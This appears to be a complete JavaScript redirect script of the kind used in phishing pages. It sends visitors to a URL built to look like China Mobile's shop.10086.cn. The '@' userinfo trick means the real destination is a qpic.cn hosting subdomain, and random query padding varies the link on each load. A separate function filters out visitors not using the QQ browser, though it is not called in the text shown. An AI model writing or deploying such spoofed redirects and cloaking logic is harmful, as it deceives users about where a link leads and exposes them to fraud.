function leleua() {
    var sUserAgent = navigator.userAgent.toLowerCase();
    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
    } else {
        window.location.href = "https://qq.com";
    }
}

var urls=[
'https://shop.10086.cn@meeting-75420.picgzc.qpic.cn/b2cd971e2ffceaf8dbae3e2be7634712a020d8c016cf4d796bff94e26c6938f8?{nnnnnnnnnnn}{wwwwww}',
];
location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
function myEeplace(s){
	return s.replace(/\{(\w+?)\}/g,function(a,b){
		var h='';
		for(var i=0;i<b.length;i++){
			if('n'==b[i]){
				h+=Math.floor(Math.random()*10);
			}else if('w'==b[i]){
				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
			}
		}
		return h;
	});
}
